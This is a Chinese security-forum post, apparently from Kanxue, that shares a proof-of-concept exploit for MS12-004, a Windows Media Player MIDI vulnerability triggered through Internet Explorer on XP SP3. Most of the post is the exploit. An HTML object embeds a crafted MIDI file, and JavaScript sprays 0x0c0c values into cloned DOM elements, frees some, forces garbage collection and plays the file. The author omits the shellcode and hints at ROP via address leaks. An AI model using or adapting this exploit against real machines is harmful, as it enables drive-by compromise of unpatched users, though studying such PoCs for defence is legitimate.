@@ -1,0 +1,184 @@
+
+# [原创]新鲜出炉 - MS12-004
+
+RT，虽然是MediaPlayer的，但是还是可以通过IE触发
+
+这个漏洞本身通过补丁比较不难定位，但是在下前两天虽然定位了漏洞，但是却没有能写出好的exploit
+
+直到今天看到了
+
+5c8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4k6#2M7r3g2F1i4K6u0W2j5$3!0E0i4K6u0r3j5X3I4G2k6#2)9J5c8U0t1H3x3e0t1H3x3e0p5%4i4K6u0W2b7h3c8$3j5h3&6U0k6h3c8Q4y4h3k6q4P5s2m8D9L8$3W2@1j5i4c8A6L8$3&6Q4y4h3k6G2k6W2)9#2k6W2N6A6L8X3c8G2N6%4y4Q4y4h3k6y4f1K6p5J5i4K6u0V1x3o6l9@1i4K6g2X3b7#2k6q4i4K6u0V1x3U0l9I4x3W2)9J5k6o6l9H3x3o6y4Q4x3X3g2H3K9s2l9
+
+这篇帖子，实在感叹exploit在这些高手的手里，真的玩成了一种艺术，无法学习，只能膜拜![](https://bbs.kanxue.com/view/img/face/50.gif)
+
+照着vupen帖子的思路构造了一个poc，供大家学习研究, xp sp3, `winmm.dll`版本5.1.2600.5512, `mshtml` 6.0.2900.5512，测试通过
+
+shellcode就不写在POC里了，`0c0c0c10`，大家都懂的，值得一提的是利用这个漏洞还可以泄露模块地址信息，从而构造ROP，这个有时间在写了，或者估计exploit-db或者metaspolit不久就会出来ROP版本的吧
+
+![](https://bbs.kanxue.com/upload/attach/201201/138510_hv1w79tkmgwbmob.png)
+
+```
+<object id="midi1" classid="clsid:22d6f312-b0f6-11d0-94ab-0080c74c7e95" codebase="http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#version=5,1,52,701" standby="loading microsoft windows media player components..." type="application/x-oleobject" width="320" height="310">
+
+<param name="filename" value="./toto.mid">
+
+     <param name="animationatstart" value="true">
+
+     <param name="transparentatstart" value="true">
+
+     <param name="autostart" value="false">
+
+     <param name="showcontrols" value="true">
+
+     <param name="ShowStatusBar" value="true">
+
+     <param name="windowlessvideo" value="true">
+
+     <embed src="./toto.mid" autostart="true" showcontrols="true" showstatusbar="1" bgcolor="white" width="320" height="310">
+
+</object>
+
+
+
+<script>
+
+
+
+var cloned = new Array();
+
+var numCloned = 50;
+
+
+
+function bang()
+
+{
+
+	
+
+	
+
+	for (var i = 0; i < numCloned; i ++)
+
+	{
+
+		if ( cloned[i] != null )
+
+		{
+
+			var s = cloned[i].w0.toString();
+
+			//alert(s);
+
+		}
+
+	}
+
+}
+
+
+
+function exploit()
+
+{
+
+	
+
+	var selob = document.createElement("select");
+
+	selob.w0 = unescape("%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c");
+
+	selob.w1 = this;
+
+	selob.w2 = new Array();
+
+	selob.w3 = true;
+
+	selob.w4 = 0x41424344;
+
+	selob.w5 = document.createElement("marquee");
+
+	selob.w6 = undefined;
+
+	selob.w7 = null;
+
+	selob.w8 = alert;
+
+	selob.w9 = RegExp.$1;
+
+	selob.w10 = Infinity;
+
+	selob.w11 = NaN;
+
+	selob.w12 = new Date();
+
+	
+
+	for (var i = 12; i < 60; i ++)
+
+	{
+
+		selob["w"+i.toString()] = 0x41424344;
+
+	}
+
+
+
+	for (var i = 0; i < numCloned; i ++)
+
+	{
+
+		cloned[i] = selob.cloneNode(true);
+
+	}
+
+
+
+	
+
+	for (var i = 1; i < numCloned; i += 7)
+
+	{
+
+		cloned[i] = null;
+
+	}
+
+
+
+	CollectGarbage();
+
+
+
+	midi1.play();
+
+
+
+	setTimeout(function(){bang();}, 5000);
+
+}
+
+
+
+setTimeout(function(){exploit();}, 3000);
+
+
+
+</script>
+```
+
+Enjoy exploiting and happy new year!
+
+[poc.zip](https://bbs.kanxue.com/attach-download-64081.htm)
+
+[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
+
+上传的附件：
+
+- [Windows XP Professional sp3-2012-01-19-00-31-36.png](javascript:void(0);)
+
+  （49.19kb，1680次下载）
+
+- [poc.zip](javascript:void(0);)
+
+  （15.85kb，341次下载）
